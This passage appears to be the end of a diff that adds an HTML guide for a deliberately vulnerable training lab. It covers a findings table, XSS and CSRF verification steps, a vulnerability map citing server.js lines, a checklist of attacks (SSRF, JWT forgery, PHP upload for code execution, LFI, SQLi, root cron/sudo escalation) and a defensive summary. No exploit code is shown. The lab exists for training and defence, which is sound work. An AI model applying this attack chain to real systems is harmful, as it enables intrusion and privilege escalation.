+<tr><td>Business logic</td><td>Loyalty redemption checks balance, waits, and updates in separate operations. Negative points are also accepted.</td><td>High</td></tr>
+<tr><td>XML</td><td>XML parser is not configured with explicit hardened entity options. The current xml2js/sax combination may reject external entities; verify rather than assuming XXE.</td><td>Medium</td></tr>
+<tr><td>CSRF</td><td>State-changing routes accept the automatically sent <code>hf_token</code> cookie and have no CSRF token or SameSite policy.</td><td>High</td></tr>
+<tr><td>Errors</td><td>Many handlers return raw exception text, URLs, and sometimes filesystem paths. Trigger invalid report paths and malformed requests to inspect leakage.</td><td>Medium</td></tr>
+<tr><td>HTTP hardening</td><td>No visible security headers, HTTPS enforcement, CSP, HSTS, or explicit secure cookie attributes are configured.</td><td>Medium</td></tr>
+<tr><td>Container</td><td>Dockerfile never switches to a non-root user. Startup creates world-writable root cron and sudo-related files and installs unnecessary tools.</td><td>Critical</td></tr>
+<tr><td>Container</td><td><code>/opt/backup.sh</code> is writable while executed by root cron; <code>/opt/report.py</code> is world-writable and referenced by a NOPASSWD sudo rule.</td><td>Critical</td></tr>
+<tr><td>Secrets</td><td>Passwords, JWT secret, administrator email, and internal paths are duplicated in source and runtime shell configuration.</td><td>High</td></tr>
+</tbody></table>
+<h3>Frontend XSS verification</h3><p>In the lab, register a test name containing harmless markup, then view the customer in the manager dashboard. Also inspect the reports page after fetching a response containing markup. The vulnerable sinks use <code>innerHTML</code>; remediation is context-safe DOM APIs or a trusted sanitizer.</p>
+<h3>CSRF verification</h3><p>Because the browser sends <code>hf_token</code> automatically, a cross-origin form can attempt cookie-authenticated state changes unless cookie SameSite and server-side CSRF defenses are added. Use only a local test browser and test account.</p></section>
+
+<section class="card" id="map"><h2>10. Vulnerability Map</h2><table><thead><tr><th>Phase</th><th>Finding</th><th>Source</th></tr></thead><tbody><tr><td>Recon</td><td>Broken access control and IDOR</td><td>server.js:141, 361</td></tr><tr><td>Secret recovery</td><td>SSRF</td><td>server.js:206</td></tr><tr><td>Privilege</td><td>Hardcoded JWT secret and trusted role</td><td>server.js:37, 54</td></tr><tr><td>Execution</td><td>MIME bypass and PHP execution</td><td>server.js:321, 340</td></tr><tr><td>Data access</td><td>Arbitrary report path read</td><td>server.js:297</td></tr><tr><td>Integrity</td><td>Price tampering and loyalty race</td><td>server.js:155, 224</td></tr><tr><td>Input</td><td>SQLi and mass assignment</td><td>server.js:80, 189</td></tr><tr><td>Container</td><td>Root process and writable cron/sudo paths</td><td>Dockerfile, scripts/start.sh</td></tr></tbody></table></section>
+
+<section class="card check" id="checklist"><h2>11. Completion Checklist</h2><label><input type="checkbox"> Obtained a customer token.</label><label><input type="checkbox"> Confirmed dashboard access and transaction IDOR.</label><label><input type="checkbox"> Retrieved the internal pricing response through SSRF.</label><label><input type="checkbox"> Forged an administrator JWT and confirmed admin stats.</label><label><input type="checkbox"> Uploaded PHP as image/jpeg and retrieved the RCE proof.</label><label><input type="checkbox"> Tested LFI, SQLi, price tampering, mass assignment, and loyalty logic.</label><label><input type="checkbox"> Reviewed authentication, XSS, CSRF, error leakage, upload, and container findings.</label><label><input type="checkbox"> Documented the XML caveat and root-container issue.</label></section>
+
+<section class="card" id="defense"><h2>12. Defensive Summary</h2><p>Use allow-listed DTOs, password hashing, rotated secrets, database-backed authorization, parameterized SQL, atomic loyalty updates, server-side pricing, hardened XML parsing, outbound request allow-lists, fixed report directories, generated upload names outside the web root, content validation, and no execution of uploaded files.</p><p>Use output encoding or safe DOM APIs, CSRF tokens and strict cookie attributes, rate limits, security headers, generic errors, audit monitoring, and server-side input bounds.</p><p>Run the application as a non-root user and remove writable root cron/sudo paths from the image.</p></section>
+</main>
+<aside class="card side"><h3>Guide Contents</h3><a href="#setup">Lab setup</a><a href="#chain">Attack chain</a><a href="#session">Normal session</a><a href="#recon">Reconnaissance</a><a href="#ssrf">Phase 1: SSRF</a><a href="#jwt">Phase 2: JWT forge</a><a href="#upload">Phase 3: RCE</a><a href="#flags">Phase 4: proofs</a><a href="#independent">Independent routes</a><a href="#audit">Full vulnerability check</a><a href="#map">Vulnerability map</a><a href="#checklist">Completion checklist</a><a href="#defense">Defensive summary</a><h3>Proof targets</h3><div class="callout">Retrieve locally from <code>/var/www/proof.txt</code>, <code>/var/www/user.txt</code>, and <code>/root/root.txt</code>.</div></aside>
+</div></div>
+</body>
+</html>
